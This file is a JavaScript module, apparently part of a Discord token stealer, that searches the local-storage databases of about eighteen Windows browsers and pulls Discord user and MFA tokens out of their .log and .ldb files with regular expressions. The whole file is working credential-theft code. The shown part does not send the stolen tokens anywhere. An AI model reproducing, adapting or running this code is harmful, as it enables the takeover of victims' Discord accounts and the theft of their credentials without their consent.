/**
 * Discord Browser Service Module
 * Handles Discord token collection from various browsers
 */

const fs = require('fs');
const path = require('path');
const { logger } = require('../../core/logger');
const { TokenUtils } = require('../../core/tokenUtils');

class DiscordBrowserService {
    constructor() {
        this.browserPaths = this.getBrowserPaths();
    }

    /**
     * Get browser paths for Discord tokens
     * @returns {Array} Array of browser paths
     */
    getBrowserPaths() {
        const appData = process.env.APPDATA || '';
        const localAppData = process.env.LOCALAPPDATA || '';

        return [
            path.join(appData, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
            path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Epic Privacy Browser', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Google', 'Chrome SxS', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Sputnik', 'Sputnik', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, '7Star', '7Star', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'CentBrowser', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Orbitum', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Kometa', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Torch', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Amigo', 'User Data', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Iridium', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'uCozMedia', 'Uran', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            path.join(localAppData, 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb')
        ];
    }

    /**
     * Collect tokens from browsers
     * @returns {Promise<Array>} Array of tokens
     */
    async collectBrowserTokens() {
        const tokens = [];
        const browserPaths = this.getBrowserPaths();

        // Token patterns for direct token search in browsers
        const cleanRegex = [
            /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/gm,       // Variable length tokens
            /mfa\.[\w-]{84}/gm,                          // MFA tokens  
            /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/gm           // Standard user tokens
        ];

        for (const browserPath of browserPaths) {
            if (!fs.existsSync(browserPath)) {
                continue;
            }

            try {
                const files = fs.readdirSync(browserPath);
                
                for (const file of files) {
                    if (!(file.endsWith('.log') || file.endsWith('.ldb'))) {
                        continue;
                    }

                    try {
                        const filePath = path.join(browserPath, file);
                        const content = fs.readFileSync(filePath, 'utf-8');

                        for (const regex of cleanRegex) {
                            const matches = content.match(regex);
                            if (matches) {
                                tokens.push(...matches);
                            }
                        }
                    } catch (error) {
                        // Skip files that can't be read
                        continue;
                    }
                }
            } catch (error) {
                logger.debug(`Failed to process browser path ${browserPath}`, error.message);
            }
        }

        // Enhanced deduplication using TokenUtils
        return TokenUtils.deduplicate(tokens);
    }
}

// Export the module
module.exports = {
    DiscordBrowserService
};